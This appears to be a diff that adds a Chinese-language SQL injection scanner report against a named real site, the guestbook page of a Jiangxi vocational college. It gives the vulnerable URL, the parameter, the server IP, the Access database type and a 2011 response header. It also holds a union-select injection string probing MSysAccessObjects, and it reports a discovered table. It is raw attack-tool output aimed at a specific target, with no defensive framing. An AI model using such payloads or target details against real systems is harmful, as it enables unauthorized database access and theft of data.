@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://www.jxcia.com/jxciawebinfo/jxciagb/jxciaguestbookbody.asp?id=22780
+ ·页面标题：江西信息应用职业技术学院~留言簿
+ ·参数:id=22780
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:59.52.200.140
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Aug 2011 01:46:25 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 19881
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDASTCARQC=BANOLPFDLEHFMAFBGGMLBEOG; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
+找到表:article
